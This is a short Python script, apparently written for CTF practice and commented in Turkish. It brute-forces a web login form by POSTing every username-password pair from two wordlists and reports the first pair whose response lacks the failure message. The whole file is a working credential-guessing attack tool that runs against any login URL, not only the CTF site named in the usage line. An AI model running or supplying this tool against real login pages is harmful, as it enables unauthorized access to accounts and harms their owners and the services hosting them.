# usage: python3 web_login_brute_force.py http://ctf-site.com/login.php users.txt passwords.txt
import requests
import sys
import argparse

def brute_force(url, users_file, passwords_file):
    try:
        with open(users_file, 'r') as f:
            users = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] {users_file} dosyası bulunamadı!")
        sys.exit(1)

    try:
        with open(passwords_file, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] {passwords_file} dosyası bulunamadı!")
        sys.exit(1)

    for user in users:
        for password in passwords:
            data = {"username": user, "password": password}
            try:
                response = requests.post(url, data=data, timeout=5)
                if "Hatalı Giriş" not in response.text:
                    print(f"[+] Başarılı! Kullanıcı: {user}, Şifre: {password}")
                    return
            except requests.exceptions.RequestException as e:
                print(f"[-] Hata: {e}")
                continue

    print("[-] Geçerli kullanıcı adı/şifre bulunamadı.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='HTTP POST Brute-Force Aracı')
    parser.add_argument('url', help='Hedef URL (örn: http://site.com/login.php)')
    parser.add_argument('users_file', help='Kullanıcı adları listesi (örn: users.txt)')
    parser.add_argument('passwords_file', help='Şifreler listesi (örn: passwords.txt)')
    args = parser.parse_args()

    brute_force(args.url, args.users_file, args.passwords_file)
